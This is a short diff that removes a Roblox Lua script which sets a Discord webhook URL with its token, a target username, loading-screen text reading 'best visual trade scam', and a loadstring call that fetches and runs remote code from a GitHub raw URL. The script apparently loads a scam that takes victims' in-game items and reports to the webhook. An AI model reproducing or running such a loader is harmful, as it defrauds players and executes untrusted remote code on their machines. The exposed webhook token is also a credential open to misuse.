@@ -1,7 +1,0 @@
-_G.UserName = "boomyt_alt10"
-
-_G.Webhook = "https://discord.com/api/webhooks/1002419147218616351/paF9bTJ1tGe6_OunQIuCpkQmK6GJT3P7aeiFff7LZDsA0-rtNddPTA2aSv1QQKv1adc0"
-
-_G.loadingScreenText = "best visual trade scam"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
